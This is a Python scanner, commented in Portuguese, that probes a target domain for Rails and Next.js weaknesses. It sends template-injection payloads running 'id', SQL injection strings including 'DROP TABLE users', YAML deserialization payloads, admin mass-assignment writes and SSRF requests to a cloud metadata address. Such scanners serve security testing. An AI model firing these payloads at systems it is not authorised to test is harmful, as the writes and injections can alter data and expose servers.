#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Ruby on Rails and Next.js Specific Vulnerability Scanner
Tests for framework-specific vulnerabilities
"""

import sys
import json
import time
import urllib.request
import urllib.error
import ssl
import re
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from datetime import datetime


@dataclass
class RailVuln:
    """Vulnerabilidade Rails específica"""
    type: str
    severity: str
    endpoint: str
    evidence: str
    payload: str = ""
    
    def to_dict(self) -> Dict:
        return {
            'type': self.type,
            'severity': self.severity,
            'endpoint': self.endpoint,
            'evidence': self.evidence[:200],
            'payload': self.payload[:100]
        }


class RubyOnRailsScanner:
    """Scanner de vulnerabilidades específicas do Ruby on Rails"""
    
    # Paths comuns do Rails
    RAILS_PATHS = [
        '/rails/info', '/rails/info/properties',
        '/assets/application.js', '/assets/application.css',
        '/system/test.txt', '/__pycache__',
        '/.ruby-version', '/Gemfile', '/Gemfile.lock',
        '/config.ru', '/public/system',
    ]
    
    # Mass assignment attributes
    MASS_ASSIGN_PARAMS = [
        'admin', 'is_admin', 'isAdmin', 'role', 'permissions',
        'authorization_level', 'access_level', 'user_type',
    ]
    
    # Template injection payloads
    TEMPLATE_PAYLOADS = [
        '<%= 7*7 %>',
        '<%=(7*7)%>',
        '{{7*7}}',
        '${7*7}',
        "#{7*7}",
        '<%= `id` %>',
        '<% system("id") %>',
    ]
    
    def __init__(self, target: str, timeout: int = 10):
        self.target = target
        self.timeout = timeout
        self.ctx = ssl.create_default_context()
        self.vulnerabilities = []
        
    def _make_request(self, url: str, method: str = 'GET', data: dict = None, headers: dict = None) -> Tuple[int, dict, str]:
        """Faz requisição HTTP"""
        if headers is None:
            headers = {'User-Agent': 'Mozilla/5.0'}
        
        try:
            if data:
                req = urllib.request.Request(
                    url,
                    data=json.dumps(data).encode('utf-8'),
                    headers=headers,
                    method=method
                )
            else:
                req = urllib.request.Request(url, headers=headers, method=method)
            
            with urllib.request.urlopen(req, timeout=self.timeout, context=self.ctx) as resp:
                body = resp.read().decode('utf-8', errors='ignore')
                return resp.status, dict(resp.headers), body
        except urllib.error.HTTPError as e:
            body = e.read().decode('utf-8', errors='ignore') if e.fp else ''
            return e.code, dict(e.headers), body
        except Exception as e:
            return 0, {}, str(e)
    
    def detect_rails(self) -> Dict:
        """Detecta se é Ruby on Rails"""
        print("[1] Detecting Ruby on Rails...")
        
        detection = {
            'is_rails': False,
            'version': None,
            'cookies': {},
            'headers': {},
            'evidence': []
        }
        
        url = f"https://{self.target}"
        status, headers, body = self._make_request(url)
        
        # Verificar headers Rails
        rail_headers = ['x-request-id', 'x-runtime', 'x-rails-cache-hit']
        for header in rail_headers:
            if header in headers:
                detection['headers'][header] = headers[header]
                detection['evidence'].append(f"Header: {header}")
        
        # Verificar cookies Rails
        set_cookie = headers.get('set-cookie', '')
        if 'session' in set_cookie.lower():
            detection['cookies']['rails_session'] = True
            detection['evidence'].append("Rails session cookie detected")
        
        # Verificar corpo da página
        if 'rails' in body.lower():
            detection['evidence'].append("Rails mentioned in HTML")
        
        # Verificar assets Rails
        asset_paths = ['/assets/application.js', '/assets/application.css']
        for path in asset_paths:
            asset_url = f"{url}{path}"
            status2, _, _ = self._make_request(asset_url)
            if status2 == 200:
                detection['evidence'].append(f"Asset found: {path}")
        
        # Rails info page (perigoso!)
        info_url = f"{url}/rails/info/properties"
        status3, _, body3 = self._make_request(info_url)
        if status3 == 200:
            detection['is_rails'] = True
            detection['evidence'].append("Rails info page accessible!")
            # Extrair versão
            version_match = re.search(r'Rails (\d+\.\d+\.\d+)', body3)
            if version_match:
                detection['version'] = version_match.group(1)
        
        detection['is_rails'] = len(detection['evidence']) >= 2
        
        if detection['is_rails']:
            print(f"  [+] Ruby on Rails detected!")
            if detection['version']:
                print(f"  Version: {detection['version']}")
            for ev in detection['evidence']:
                print(f"  - {ev}")
        else:
            print("  [-] Not detected as Ruby on Rails")
        
        return detection
    
    def test_mass_assignment(self, token: str = None) -> List[RailVuln]:
        """Testa mass assignment vulnerability"""
        print("\n[2] Testing mass assignment...")
        
        vulns = []
        url = f"https://{self.target}"
        
        # Testar params de mass assignment em endpoints comuns
        test_endpoints = [
            '/api/user', '/api/users', '/api/account', '/api/profile',
            '/users', '/accounts', '/profile',
        ]
        
        for endpoint in test_endpoints:
            full_url = f"{url}{endpoint}"
            
            for param in self.MASS_ASSIGN_PARAMS:
                data = {param: True}
                if token:
                    headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'}
                else:
                    headers = {'Content-Type': 'application/json'}
                
                status, resp_headers, body = self._make_request(full_url, 'PUT' if 'user' in endpoint else 'POST', data, headers)
                
                # Verificar se o atributo foi aceito
                if status in [200, 201, 204]:
                    # Verificar no response se o atributo foi setado
                    try:
                        resp_data = json.loads(body) if body else {}
                        if param in resp_data:
                            vulns.append(RailVuln(
                                type='Mass Assignment',
                                severity='CRITICAL',
                                endpoint=full_url,
                                evidence=f"Parameter '{param}' accepted and returned",
                                payload=f"{param}=true"
                            ))
                            print(f"  [CRITICAL] {endpoint} - Mass assignment via {param}")
                    except:
                        pass
        
        return vulns
    
    def test_template_injection(self) -> List[RailVuln]:
        """Testa template injection (ERB/Slim/Haml)"""
        print("\n[3] Testing template injection...")
        
        vulns = []
        url = f"https://{self.target}"
        
        # Templates comuns do Rails
        template_paths = [
            '/404', '/500', '/422',
            '/errors/not-found', '/errors/internal-error',
        ]
        
        for path in template_paths:
            test_url = f"{url}{path}"
            
            # Testar com params que podem injetar template
            for payload in self.TEMPLATE_PAYLOADS[:3]:  # Limitar testes
                test_path = f"{path}?template={payload}"
                status, _, body = self._make_request(f"{url}{test_path}")
                
                # Verificar se o resultado da expressão aparece
                if '49' in body or 'id:' in body.lower():
                    vulns.append(RailVuln(
                        type='Template Injection',
                        severity='CRITICAL',
                        endpoint=test_url,
                        evidence="Template injection successful - expression evaluated",
                        payload=payload
                    ))
                    print(f"  [CRITICAL] Template injection via {path}")
                    break
        
        return vulns
    
    def test_active_record_injection(self) -> List[RailVuln]:
        """Testa Active Record injection"""
        print("\n[4] Testing Active Record injection...")
        
        vulns = []
        url = f"https://{self.target}"
        
        # SQL injection patterns
        sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "1; DROP TABLE users--",
        ]
        
        # Testar em params comuns
        test_params = ['id', 'user_id', 'category', 'search', 'q']
        
        for param in test_params:
            for payload in sqli_payloads:
                test_url = f"{url}/api/search?{param}={payload}"
                status, _, body = self._make_request(test_url)
                
                # Verificar erros SQL
                sql_errors = ['sqlite', 'mysql', 'postgres', 'syntax error', 'sql injection']
                if any(err in body.lower() for err in sql_errors):
                    vulns.append(RailVuln(
                        type='SQL Injection',
                        severity='CRITICAL',
                        endpoint=test_url,
                        evidence="SQL error in response",
                        payload=payload
                    ))
                    print(f"  [CRITICAL] SQLi via {param}")
                    break
        
        return vulns
    
    def test_session_fixation(self) -> List[RailVuln]:
        """Testa session fixation"""
        print("\n[5] Testing session fixation...")
        
        vulns = []
        url = f"https://{self.target}"
        
        # Testar se session é mantida após login
        session_handlers = [
            '/login', '/auth', '/session', '/sign_in',
        ]
        
        for handler in session_handlers:
            test_url = f"{url}{handler}"
            status, headers, body = self._make_request(test_url)
            
            # Verificar cookies de session
            set_cookies = headers.get('set-cookie', '')
            if 'session' in set_cookies.lower():
                # Extrair nome da session
                session_match = re.search(r'(session[_\w]*)=', set_cookies)
                if session_match:
                    session_name = session_match.group(1)
                    vulns.append(RailVuln(
                        type='Session Fixation',
                        severity='MEDIUM',
                        endpoint=test_url,
                        evidence=f"Session cookie: {session_name}",
                        payload=f"Cookie name: {session_name}"
                    ))
        
        return vulns
    
    def test_yaml_deserialization(self) -> List[RailVuln]:
        """Testa YAML deserialization vulnerability"""
        print("\n[6] Testing YAML deserialization...")
        
        vulns = []
        url = f"https://{self.target}"
        
        # YAML injection payloads
        yaml_payloads = [
            "!ruby/object:ActiveSupport::Dependencies::Requirement",
            "--- !ruby/object:Kernel {}",
            "!<tag:yaml.org,2002:python/object/apply:os.system ['id']]",
        ]
        
        # Testar em content-type YAML
        test_urls = [
            f"{url}/api/import",
            f"{url}/api/upload",
            f"{url}/webhooks",
        ]
        
        for test_url in test_urls:
            for payload in yaml_payloads:
                headers = {'Content-Type': 'text/yaml'}
                status, _, body = self._make_request(test_url, 'POST', payload, headers)
                
                # Verificar erros de parsing
                if 'psych' in body.lower() or 'yaml' in body.lower() or 'marshal' in body.lower():
                    vulns.append(RailVuln(
                        type='YAML Deserialization',
                        severity='CRITICAL',
                        endpoint=test_url,
                        evidence="YAML parsing error indicates vulnerability",
                        payload=payload[:50]
                    ))
                    print(f"  [CRITICAL] YAML deserialization via {test_url}")
                    break
        
        return vulns
    
    def test_rails_specific(self) -> Dict:
        """Executa testes específicos do Rails"""
        print("\n" + "=" * 60)
        print("  RUBY ON RAILS VULNERABILITY SCANNER")
        print("=" * 60)
        print()
        
        all_vulns = []
        
        # Detectar Rails
        detection = self.detect_rails()
        
        if not detection['is_rails']:
            print("\n[-] Not a Rails application, skipping Rails-specific tests")
            return {
                'detected': False,
                'vulnerabilities': [],
                'summary': {'total': 0}
            }
        
        # Executar testes
        tests = [
            ("Mass Assignment", self.test_mass_assignment),
            ("Template Injection", self.test_template_injection),
            ("Active Record Injection", self.test_active_record_injection),
            ("Session Fixation", self.test_session_fixation),
            ("YAML Deserialization", self.test_yaml_deserialization),
        ]
        
        for name, test_func in tests:
            try:
                vulns = test_func()
                all_vulns.extend(vulns)
            except Exception as e:
                print(f"  [ERROR] {name}: {e}")
        
        # Resumo
        critical = [v for v in all_vulns if v.severity == 'CRITICAL']
        high = [v for v in all_vulns if v.severity == 'HIGH']
        medium = [v for v in all_vulns if v.severity == 'MEDIUM']
        
        print("\n" + "=" * 60)
        print("  RAILS SCAN SUMMARY")
        print("=" * 60)
        print(f"  Rails Detected: Yes")
        if detection.get('version'):
            print(f"  Rails Version: {detection['version']}")
        print(f"  Total Vulnerabilities: {len(all_vulns)}")
        print(f"    - Critical: {len(critical)}")
        print(f"    - High: {len(high)}")
        print(f"    - Medium: {len(medium)}")
        print("=" * 60)
        
        return {
            'detected': True,
            'version': detection.get('version'),
            'vulnerabilities': [v.to_dict() for v in all_vulns],
            'summary': {
                'total': len(all_vulns),
                'critical': len(critical),
                'high': len(high),
                'medium': len(medium)
            }
        }


class NextJSScanner:
    """Scanner de vulnerabilidades específicas do Next.js"""
    
    NEXT_PATHS = [
        '/_next/', '/_next/static/', '/_next/data/',
        '/api/', '/pages/',
    ]
    
    SSRF_PAYLOADS = [
        'http://169.254.169.254/latest/meta-data/',
        'http://localhost:3000/',
        'http://localhost:8080/',
        'http://[::]:3000/',
    ]
    
    def __init__(self, target: str, timeout: int = 10):
        self.target = target
        self.timeout = timeout
        self.ctx = ssl.create_default_context()
        self.vulnerabilities = []
        
    def detect_nextjs(self) -> Dict:
        """Detecta Next.js"""
        url = f"https://{self.target}"
        status, headers, body = self._make_request(url)
        
        detection = {
            'is_nextjs': False,
            'version': None,
            'evidence': []
        }
        
        # Verificar headers Next.js
        if 'x-nextjs-cache' in headers:
            detection['evidence'].append("X-NEXTJS-CACHE header")
        
        # Verificar paths Next.js
        for path in self.NEXT_PATHS:
            test_url = f"{url}{path}"
            status2, _, _ = self._make_request(test_url)
            if status2 == 200:
                detection['evidence'].append(f"Path exists: {path}")
        
        # Verificar body
        if '_next' in body:
            detection['evidence'].append("_next in HTML")
        
        version_match = re.search(r'next[\s/:]?(\d+\.\d+\.\d+)', body, re.I)
        if version_match:
            detection['version'] = version_match.group(1)
        
        detection['is_nextjs'] = len(detection['evidence']) >= 2
        
        if detection['is_nextjs']:
            print(f"  [+] Next.js detected!")
            for ev in detection['evidence']:
                print(f"  - {ev}")
        else:
            print("  [-] Not detected as Next.js")
        
        return detection
    
    def _make_request(self, url: str, method: str = 'GET', data: dict = None, headers: dict = None) -> Tuple[int, dict, str]:
        if headers is None:
            headers = {'User-Agent': 'Mozilla/5.0'}
        
        try:
            if data:
                req = urllib.request.Request(
                    url,
                    data=json.dumps(data).encode('utf-8'),
                    headers=headers,
                    method=method
                )
            else:
                req = urllib.request.Request(url, headers=headers, method=method)
            
            with urllib.request.urlopen(req, timeout=self.timeout, context=self.ctx) as resp:
                return resp.status, dict(resp.headers), resp.read().decode('utf-8', errors='ignore')
        except urllib.error.HTTPError as e:
            body = e.read().decode('utf-8', errors='ignore') if e.fp else ''
            return e.code, dict(e.headers), body
        except Exception as e:
            return 0, {}, str(e)
    
    def test_ssr_image_component(self) -> List[Dict]:
        """Testa SSRF via Image component"""
        print("\n[Next.js] Testing Image SSRF...")
        
        vulns = []
        url = f"https://{self.target}"
        
        # Procurar endpoints que aceitam URLs
        image_endpoints = [
            '/api/image', '/api/avatar', '/api/upload',
            '/api/proxy', '/api/fetch',
        ]
        
        for endpoint in image_endpoints:
            for payload in self.SSRF_PAYLOADS:
                data = {'url': payload, 'src': payload}
                status, _, body = self._make_request(f"{url}{endpoint}", 'POST', data)
                
                if status == 200 and ('meta-data' in body or 'instance-' in body):
                    vulns.append({
                        'type': 'SSRF via Image',
                        'severity': 'HIGH',
                        'endpoint': f"{url}{endpoint}",
                        'payload': payload,
                        'evidence': 'AWS metadata accessed'
                    })
        
        return vulns
    
    def test_api_routes(self) -> List[Dict]:
        """Testa API routes"""
        print("\n[Next.js] Testing API routes...")
        
        vulns = []
        url = f"https://{self.target}"
        
        # Enumerar API routes
        api_paths = [
            '/api/user', '/api/users', '/api/auth',
            '/api/login', '/api/register', '/api/profile',
            '/api/admin', '/api/settings',
        ]
        
        for path in api_paths:
            status, _, body = self._make_request(f"{url}{path}")
            
            if status == 200:
                vulns.append({
                    'type': 'API Route Discovery',
                    'severity': 'INFO',
                    'endpoint': f"{url}{path}",
                    'status': 200
                })
            elif status == 405:  # Method Not Allowed - route exists
                vulns.append({
                    'type': 'API Route Found',
                    'severity': 'MEDIUM',
                    'endpoint': f"{url}{path}",
                    'status': 405
                })
        
        return vulns
    
    def test_getserversideprops(self) -> List[Dict]:
        """Testa SSR via getServerSideProps"""
        print("\n[Next.js] Testing SSR...")
        
        vulns = []
        url = f"https://{self.target}"
        
        # Verificar se há dados sensíveis no HTML
        status, _, body = self._make_request(url)
        
        # Procurar por dados sensíveis
        sensitive_patterns = [
            r'api[_-]?key["\s:]+\s*["\']([a-zA-Z0-9_-]{20,})',
            r'secret["\s:]+\s*["\']([a-zA-Z0-9_-]{20,})',
            r'password["\s:]+\s*["\']([^"\']{8,})',
            r'token["\s:]+\s*["\']([a-zA-Z0-9_.-]{20,})',
        ]
        
        for pattern in sensitive_patterns:
            matches = re.findall(pattern, body)
            if matches:
                vulns.append({
                    'type': 'Sensitive Data in SSR',
                    'severity': 'HIGH',
                    'evidence': f"Found {len(matches)} potential secrets in HTML"
                })
        
        return vulns
    
    def run_scan(self) -> Dict:
        """Executa scan Next.js completo"""
        print("\n" + "=" * 60)
        print("  NEXT.JS VULNERABILITY SCANNER")
        print("=" * 60)
        print()
        
        # Detectar Next.js
        detection = self.detect_nextjs()
        
        if not detection['is_nextjs']:
            return {
                'detected': False,
                'vulnerabilities': [],
                'summary': {'total': 0}
            }
        
        all_vulns = []
        
        # Executar testes
        tests = [
            self.test_ssr_image_component,
            self.test_api_routes,
            self.test_getserversideprops,
        ]
        
        for test in tests:
            try:
                vulns = test()
                all_vulns.extend(vulns)
            except Exception as e:
                print(f"  [ERROR] Test failed: {e}")
        
        # Resumo
        critical = [v for v in all_vulns if v.get('severity') == 'CRITICAL']
        high = [v for v in all_vulns if v.get('severity') == 'HIGH']
        medium = [v for v in all_vulns if v.get('severity') == 'MEDIUM']
        
        print("\n" + "=" * 60)
        print("  NEXT.JS SCAN SUMMARY")
        print("=" * 60)
        print(f"  Next.js Detected: Yes")
        if detection.get('version'):
            print(f"  Version: {detection['version']}")
        print(f"  Total Vulnerabilities: {len(all_vulns)}")
        print(f"    - Critical: {len(critical)}")
        print(f"    - High: {len(high)}")
        print(f"    - Medium: {len(medium)}")
        print("=" * 60)
        
        return {
            'detected': True,
            'version': detection.get('version'),
            'vulnerabilities': all_vulns,
            'summary': {
                'total': len(all_vulns),
                'critical': len(critical),
                'high': len(high),
                'medium': len(medium)
            }
        }


def main():
    import argparse
    parser = argparse.ArgumentParser(description='Rails/Next.js Vulnerability Scanner')
    parser.add_argument('target', help='Target domain')
    parser.add_argument('--token', help='JWT token for authenticated tests')
    parser.add_argument('--output', '-o', help='Output file')
    
    args = parser.parse_args()
    
    # Rails scan
    print("\n" + "=" * 60)
    print("  FRAMEWORK-SPECIFIC VULNERABILITY SCANNER")
    print("=" * 60)
    print()
    
    rails_scanner = RubyOnRailsScanner(args.target)
    rails_result = rails_scanner.test_rails_specific()
    
    # Next.js scan
    nextjs_scanner = NextJSScanner(args.target)
    nextjs_result = nextjs_scanner.run_scan()
    
    # Combined summary
    print("\n" + "=" * 60)
    print("  COMBINED SCAN RESULTS")
    print("=" * 60)
    
    total_vulns = len(rails_result.get('vulnerabilities', [])) + len(nextjs_result.get('vulnerabilities', []))
    print(f"  Total Framework Vulnerabilities: {total_vulns}")
    
    if args.output:
        result = {
            'target': args.target,
            'rails': rails_result,
            'nextjs': nextjs_result,
            'timestamp': datetime.now().isoformat()
        }
        with open(args.output, 'w') as f:
            json.dump(result, f, indent=2)
        print(f"\n[SAVE] Results saved to {args.output}")
    
    return result


if __name__ == "__main__":
    main()
